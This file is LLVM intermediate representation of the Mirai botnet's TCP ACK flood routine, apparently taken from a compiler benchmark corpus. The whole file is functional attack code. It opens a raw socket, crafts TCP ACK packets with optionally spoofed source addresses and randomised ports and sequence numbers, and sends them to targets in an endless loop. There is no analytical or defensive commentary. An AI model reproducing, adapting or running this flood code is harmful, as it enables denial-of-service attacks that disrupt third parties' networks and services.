; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_tcp.c_attack_tcp_ack.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_tcp.c_attack_tcp_ack.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.attack_option = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i32, i64, i32, i32, i8*, i8* }
%struct.tcphdr = type { i32, i32, i32, i32, i32, i32, i32, i64, i8*, i8*, i8*, i8*, i8* }
%struct.sockaddr = type { i32 }

@ATK_OPT_IP_TOS = common dso_local global i32 0, align 4
@ATK_OPT_IP_IDENT = common dso_local global i32 0, align 4
@ATK_OPT_IP_TTL = common dso_local global i32 0, align 4
@ATK_OPT_IP_DF = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@ATK_OPT_SPORT = common dso_local global i32 0, align 4
@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@ATK_OPT_SEQRND = common dso_local global i32 0, align 4
@ATK_OPT_ACKRND = common dso_local global i32 0, align 4
@ATK_OPT_URG = common dso_local global i32 0, align 4
@ATK_OPT_ACK = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@ATK_OPT_PSH = common dso_local global i32 0, align 4
@ATK_OPT_RST = common dso_local global i32 0, align 4
@ATK_OPT_SYN = common dso_local global i32 0, align 4
@ATK_OPT_FIN = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_SIZE = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_RAND = common dso_local global i32 0, align 4
@ATK_OPT_SOURCE = common dso_local global i32 0, align 4
@LOCAL_ADDR = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_tcp_ack(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %36 = load i32, i32* %5, align 4
  %37 = call i8* @calloc(i32 %36, i32 8)
  %38 = bitcast i8* %37 to i8**
  store i8** %38, i8*** %11, align 8
  %39 = load i32, i32* %7, align 4
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = load i32, i32* @ATK_OPT_IP_TOS, align 4
  %42 = call i8* @attack_get_opt_int(i32 %39, %struct.attack_option* %40, i32 %41, i32 0)
  %43 = ptrtoint i8* %42 to i32
  store i32 %43, i32* %12, align 4
  %44 = load i32, i32* %7, align 4
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = load i32, i32* @ATK_OPT_IP_IDENT, align 4
  %47 = call i8* @attack_get_opt_int(i32 %44, %struct.attack_option* %45, i32 %46, i32 65535)
  %48 = ptrtoint i8* %47 to i32
  store i32 %48, i32* %13, align 4
  %49 = load i32, i32* %7, align 4
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = load i32, i32* @ATK_OPT_IP_TTL, align 4
  %52 = call i8* @attack_get_opt_int(i32 %49, %struct.attack_option* %50, i32 %51, i32 64)
  %53 = ptrtoint i8* %52 to i32
  store i32 %53, i32* %14, align 4
  %54 = load i32, i32* %7, align 4
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = load i32, i32* @ATK_OPT_IP_DF, align 4
  %57 = load i32, i32* @FALSE, align 4
  %58 = call i8* @attack_get_opt_int(i32 %54, %struct.attack_option* %55, i32 %56, i32 %57)
  store i8* %58, i8** %15, align 8
  %59 = load i32, i32* %7, align 4
  %60 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %61 = load i32, i32* @ATK_OPT_SPORT, align 4
  %62 = call i8* @attack_get_opt_int(i32 %59, %struct.attack_option* %60, i32 %61, i32 65535)
  %63 = ptrtoint i8* %62 to i32
  store i32 %63, i32* %16, align 4
  %64 = load i32, i32* %7, align 4
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @ATK_OPT_DPORT, align 4
  %67 = call i8* @attack_get_opt_int(i32 %64, %struct.attack_option* %65, i32 %66, i32 65535)
  %68 = ptrtoint i8* %67 to i32
  store i32 %68, i32* %17, align 4
  %69 = load i32, i32* %7, align 4
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = load i32, i32* @ATK_OPT_SEQRND, align 4
  %72 = call i8* @attack_get_opt_int(i32 %69, %struct.attack_option* %70, i32 %71, i32 65535)
  %73 = ptrtoint i8* %72 to i32
  store i32 %73, i32* %18, align 4
  %74 = load i32, i32* %7, align 4
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = load i32, i32* @ATK_OPT_ACKRND, align 4
  %77 = call i8* @attack_get_opt_int(i32 %74, %struct.attack_option* %75, i32 %76, i32 65535)
  %78 = ptrtoint i8* %77 to i32
  store i32 %78, i32* %19, align 4
  %79 = load i32, i32* %7, align 4
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = load i32, i32* @ATK_OPT_URG, align 4
  %82 = load i32, i32* @FALSE, align 4
  %83 = call i8* @attack_get_opt_int(i32 %79, %struct.attack_option* %80, i32 %81, i32 %82)
  store i8* %83, i8** %20, align 8
  %84 = load i32, i32* %7, align 4
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = load i32, i32* @ATK_OPT_ACK, align 4
  %87 = load i32, i32* @TRUE, align 4
  %88 = call i8* @attack_get_opt_int(i32 %84, %struct.attack_option* %85, i32 %86, i32 %87)
  store i8* %88, i8** %21, align 8
  %89 = load i32, i32* %7, align 4
  %90 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %91 = load i32, i32* @ATK_OPT_PSH, align 4
  %92 = load i32, i32* @FALSE, align 4
  %93 = call i8* @attack_get_opt_int(i32 %89, %struct.attack_option* %90, i32 %91, i32 %92)
  store i8* %93, i8** %22, align 8
  %94 = load i32, i32* %7, align 4
  %95 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %96 = load i32, i32* @ATK_OPT_RST, align 4
  %97 = load i32, i32* @FALSE, align 4
  %98 = call i8* @attack_get_opt_int(i32 %94, %struct.attack_option* %95, i32 %96, i32 %97)
  store i8* %98, i8** %23, align 8
  %99 = load i32, i32* %7, align 4
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = load i32, i32* @ATK_OPT_SYN, align 4
  %102 = load i32, i32* @FALSE, align 4
  %103 = call i8* @attack_get_opt_int(i32 %99, %struct.attack_option* %100, i32 %101, i32 %102)
  store i8* %103, i8** %24, align 8
  %104 = load i32, i32* %7, align 4
  %105 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %106 = load i32, i32* @ATK_OPT_FIN, align 4
  %107 = load i32, i32* @FALSE, align 4
  %108 = call i8* @attack_get_opt_int(i32 %104, %struct.attack_option* %105, i32 %106, i32 %107)
  store i8* %108, i8** %25, align 8
  %109 = load i32, i32* %7, align 4
  %110 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %111 = load i32, i32* @ATK_OPT_PAYLOAD_SIZE, align 4
  %112 = call i8* @attack_get_opt_int(i32 %109, %struct.attack_option* %110, i32 %111, i32 512)
  %113 = ptrtoint i8* %112 to i32
  store i32 %113, i32* %26, align 4
  %114 = load i32, i32* %7, align 4
  %115 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %116 = load i32, i32* @ATK_OPT_PAYLOAD_RAND, align 4
  %117 = load i32, i32* @TRUE, align 4
  %118 = call i8* @attack_get_opt_int(i32 %114, %struct.attack_option* %115, i32 %116, i32 %117)
  store i8* %118, i8** %27, align 8
  %119 = load i32, i32* %7, align 4
  %120 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %121 = load i32, i32* @ATK_OPT_SOURCE, align 4
  %122 = load i32, i32* @LOCAL_ADDR, align 4
  %123 = call i32 @attack_get_opt_ip(i32 %119, %struct.attack_option* %120, i32 %121, i32 %122)
  store i32 %123, i32* %28, align 4
  %124 = load i32, i32* @AF_INET, align 4
  %125 = load i32, i32* @SOCK_RAW, align 4
  %126 = load i32, i32* @IPPROTO_TCP, align 4
  %127 = call i32 @socket(i32 %124, i32 %125, i32 %126)
  store i32 %127, i32* %10, align 4
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %130

129:                                              ; preds = %4
  br label %412

130:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %131 = load i32, i32* %10, align 4
  %132 = load i32, i32* @IPPROTO_IP, align 4
  %133 = load i32, i32* @IP_HDRINCL, align 4
  %134 = call i32 @setsockopt(i32 %131, i32 %132, i32 %133, i32* %9, i32 4)
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %136, label %139

136:                                              ; preds = %130
  %137 = load i32, i32* %10, align 4
  %138 = call i32 @close(i32 %137)
  br label %412

139:                                              ; preds = %130
  store i32 0, i32* %9, align 4
  br label %140

140:                                              ; preds = %255, %139
  %141 = load i32, i32* %9, align 4
  %142 = load i32, i32* %5, align 4
  %143 = icmp slt i32 %141, %142
  br i1 %143, label %144, label %258

144:                                              ; preds = %140
  %145 = call i8* @calloc(i32 1510, i32 1)
  %146 = load i8**, i8*** %11, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i8*, i8** %146, i64 %148
  store i8* %145, i8** %149, align 8
  %150 = load i8**, i8*** %11, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8*, i8** %150, i64 %152
  %154 = load i8*, i8** %153, align 8
  %155 = bitcast i8* %154 to %struct.iphdr*
  store %struct.iphdr* %155, %struct.iphdr** %29, align 8
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i64 1
  %158 = bitcast %struct.iphdr* %157 to %struct.tcphdr*
  store %struct.tcphdr* %158, %struct.tcphdr** %30, align 8
  %159 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %160 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %159, i64 1
  %161 = bitcast %struct.tcphdr* %160 to i8*
  store i8* %161, i8** %31, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 0
  store i32 4, i32* %163, align 8
  %164 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 1
  store i32 5, i32* %165, align 4
  %166 = load i32, i32* %12, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  store i32 %166, i32* %168, align 8
  %169 = load i32, i32* %26, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 136, %170
  %172 = trunc i64 %171 to i32
  %173 = call i8* @htons(i32 %172)
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 10
  store i8* %173, i8** %175, align 8
  %176 = load i32, i32* %13, align 4
  %177 = call i8* @htons(i32 %176)
  %178 = ptrtoint i8* %177 to i32
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i32 %178, i32* %180, align 4
  %181 = load i32, i32* %14, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 4
  store i32 %181, i32* %183, align 8
  %184 = load i8*, i8** %15, align 8
  %185 = icmp ne i8* %184, null
  br i1 %185, label %186, label %190

186:                                              ; preds = %144
  %187 = call i8* @htons(i32 16384)
  %188 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 9
  store i8* %187, i8** %189, align 8
  br label %190

190:                                              ; preds = %186, %144
  %191 = load i32, i32* @IPPROTO_TCP, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 8
  store i32 %191, i32* %193, align 4
  %194 = load i32, i32* %28, align 4
  %195 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 5
  store i32 %194, i32* %196, align 4
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i32, i32* %201, align 4
  %203 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 7
  store i32 %202, i32* %204, align 8
  %205 = load i32, i32* %16, align 4
  %206 = call i8* @htons(i32 %205)
  %207 = ptrtoint i8* %206 to i32
  %208 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i32 %207, i32* %209, align 8
  %210 = load i32, i32* %17, align 4
  %211 = call i8* @htons(i32 %210)
  %212 = ptrtoint i8* %211 to i32
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 1
  store i32 %212, i32* %214, align 4
  %215 = load i32, i32* %18, align 4
  %216 = call i8* @htons(i32 %215)
  %217 = ptrtoint i8* %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 8
  %220 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 3
  store i32 5, i32* %221, align 4
  %222 = load i8*, i8** %20, align 8
  %223 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 12
  store i8* %222, i8** %224, align 8
  %225 = load i8*, i8** %21, align 8
  %226 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 11
  store i8* %225, i8** %227, align 8
  %228 = load i8*, i8** %22, align 8
  %229 = ptrtoint i8* %228 to i32
  %230 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 4
  store i32 %229, i32* %231, align 8
  %232 = load i8*, i8** %23, align 8
  %233 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 10
  store i8* %232, i8** %234, align 8
  %235 = load i8*, i8** %24, align 8
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 9
  store i8* %235, i8** %237, align 8
  %238 = load i8*, i8** %25, align 8
  %239 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 8
  store i8* %238, i8** %240, align 8
  %241 = call i32 (...) @rand_next()
  %242 = and i32 %241, 65535
  %243 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 5
  store i32 %242, i32* %244, align 4
  %245 = load i8*, i8** %22, align 8
  %246 = icmp ne i8* %245, null
  br i1 %246, label %247, label %251

247:                                              ; preds = %190
  %248 = load i32, i32* @TRUE, align 4
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  store i32 %248, i32* %250, align 8
  br label %251

251:                                              ; preds = %247, %190
  %252 = load i8*, i8** %31, align 8
  %253 = load i32, i32* %26, align 4
  %254 = call i32 @rand_str(i8* %252, i32 %253)
  br label %255

255:                                              ; preds = %251
  %256 = load i32, i32* %9, align 4
  %257 = add nsw i32 %256, 1
  store i32 %257, i32* %9, align 4
  br label %140

258:                                              ; preds = %140
  br label %259

259:                                              ; preds = %411, %258
  %260 = load i32, i32* @TRUE, align 4
  %261 = icmp ne i32 %260, 0
  br i1 %261, label %262, label %412

262:                                              ; preds = %259
  store i32 0, i32* %9, align 4
  br label %263

263:                                              ; preds = %408, %262
  %264 = load i32, i32* %9, align 4
  %265 = load i32, i32* %5, align 4
  %266 = icmp slt i32 %264, %265
  br i1 %266, label %267, label %411

267:                                              ; preds = %263
  %268 = load i8**, i8*** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds i8*, i8** %268, i64 %270
  %272 = load i8*, i8** %271, align 8
  store i8* %272, i8** %32, align 8
  %273 = load i8*, i8** %32, align 8
  %274 = bitcast i8* %273 to %struct.iphdr*
  store %struct.iphdr* %274, %struct.iphdr** %33, align 8
  %275 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i64 1
  %277 = bitcast %struct.iphdr* %276 to %struct.tcphdr*
  store %struct.tcphdr* %277, %struct.tcphdr** %34, align 8
  %278 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i64 1
  %280 = bitcast %struct.tcphdr* %279 to i8*
  store i8* %280, i8** %35, align 8
  %281 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %282 = load i32, i32* %9, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %281, i64 %283
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 4
  %287 = icmp slt i32 %286, 32
  br i1 %287, label %288, label %309

288:                                              ; preds = %267
  %289 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i64 %291
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i32 0, i32 2
  %294 = load i32, i32* %293, align 4
  %295 = call i64 @ntohl(i32 %294)
  %296 = call i32 (...) @rand_next()
  %297 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %298 = load i32, i32* %9, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i64 %299
  %301 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 4
  %303 = ashr i32 %296, %302
  %304 = sext i32 %303 to i64
  %305 = add nsw i64 %295, %304
  %306 = call i32 @htonl(i64 %305)
  %307 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 7
  store i32 %306, i32* %308, align 8
  br label %309

309:                                              ; preds = %288, %267
  %310 = load i32, i32* %28, align 4
  %311 = icmp eq i32 %310, -1
  br i1 %311, label %312, label %316

312:                                              ; preds = %309
  %313 = call i32 (...) @rand_next()
  %314 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 5
  store i32 %313, i32* %315, align 4
  br label %316

316:                                              ; preds = %312, %309
  %317 = load i32, i32* %13, align 4
  %318 = icmp eq i32 %317, 65535
  br i1 %318, label %319, label %324

319:                                              ; preds = %316
  %320 = call i32 (...) @rand_next()
  %321 = and i32 %320, 65535
  %322 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  store i32 %321, i32* %323, align 4
  br label %324

324:                                              ; preds = %319, %316
  %325 = load i32, i32* %16, align 4
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %332

327:                                              ; preds = %324
  %328 = call i32 (...) @rand_next()
  %329 = and i32 %328, 65535
  %330 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %331 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %330, i32 0, i32 0
  store i32 %329, i32* %331, align 8
  br label %332

332:                                              ; preds = %327, %324
  %333 = load i32, i32* %17, align 4
  %334 = icmp eq i32 %333, 65535
  br i1 %334, label %335, label %340

335:                                              ; preds = %332
  %336 = call i32 (...) @rand_next()
  %337 = and i32 %336, 65535
  %338 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i32 0, i32 1
  store i32 %337, i32* %339, align 4
  br label %340

340:                                              ; preds = %335, %332
  %341 = load i32, i32* %18, align 4
  %342 = icmp eq i32 %341, 65535
  br i1 %342, label %343, label %347

343:                                              ; preds = %340
  %344 = call i32 (...) @rand_next()
  %345 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %346 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %345, i32 0, i32 2
  store i32 %344, i32* %346, align 8
  br label %347

347:                                              ; preds = %343, %340
  %348 = load i32, i32* %19, align 4
  %349 = icmp eq i32 %348, 65535
  br i1 %349, label %350, label %354

350:                                              ; preds = %347
  %351 = call i32 (...) @rand_next()
  %352 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %353 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %352, i32 0, i32 6
  store i32 %351, i32* %353, align 8
  br label %354

354:                                              ; preds = %350, %347
  %355 = load i8*, i8** %27, align 8
  %356 = icmp ne i8* %355, null
  br i1 %356, label %357, label %361

357:                                              ; preds = %354
  %358 = load i8*, i8** %35, align 8
  %359 = load i32, i32* %26, align 4
  %360 = call i32 @rand_str(i8* %358, i32 %359)
  br label %361

361:                                              ; preds = %357, %354
  %362 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 6
  store i64 0, i64* %363, align 8
  %364 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %365 = bitcast %struct.iphdr* %364 to i32*
  %366 = call i64 @checksum_generic(i32* %365, i32 56)
  %367 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 6
  store i64 %366, i64* %368, align 8
  %369 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 7
  store i64 0, i64* %370, align 8
  %371 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %372 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %373 = load i32, i32* %26, align 4
  %374 = sext i32 %373 to i64
  %375 = add i64 80, %374
  %376 = trunc i64 %375 to i32
  %377 = call i8* @htons(i32 %376)
  %378 = load i32, i32* %26, align 4
  %379 = sext i32 %378 to i64
  %380 = add i64 80, %379
  %381 = trunc i64 %380 to i32
  %382 = call i64 @checksum_tcpudp(%struct.iphdr* %371, %struct.tcphdr* %372, i8* %377, i32 %381)
  %383 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 7
  store i64 %382, i64* %384, align 8
  %385 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %386 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %385, i32 0, i32 1
  %387 = load i32, i32* %386, align 4
  %388 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %389 = load i32, i32* %9, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i64 %390
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i32 0, i32 1
  %393 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %392, i32 0, i32 0
  store i32 %387, i32* %393, align 4
  %394 = load i32, i32* %10, align 4
  %395 = load i8*, i8** %32, align 8
  %396 = load i32, i32* %26, align 4
  %397 = sext i32 %396 to i64
  %398 = add i64 136, %397
  %399 = trunc i64 %398 to i32
  %400 = load i32, i32* @MSG_NOSIGNAL, align 4
  %401 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i32 0, i32 1
  %406 = bitcast %struct.TYPE_2__* %405 to %struct.sockaddr*
  %407 = call i32 @sendto(i32 %394, i8* %395, i32 %399, i32 %400, %struct.sockaddr* %406, i32 4)
  br label %408

408:                                              ; preds = %361
  %409 = load i32, i32* %9, align 4
  %410 = add nsw i32 %409, 1
  store i32 %410, i32* %9, align 4
  br label %263

411:                                              ; preds = %263
  br label %259

412:                                              ; preds = %129, %136, %259
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i32 @attack_get_opt_ip(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @rand_next(...) #1

declare dso_local i32 @rand_str(i8*, i32) #1

declare dso_local i32 @htonl(i64) #1

declare dso_local i64 @ntohl(i32) #1

declare dso_local i64 @checksum_generic(i32*, i32) #1

declare dso_local i64 @checksum_tcpudp(%struct.iphdr*, %struct.tcphdr*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
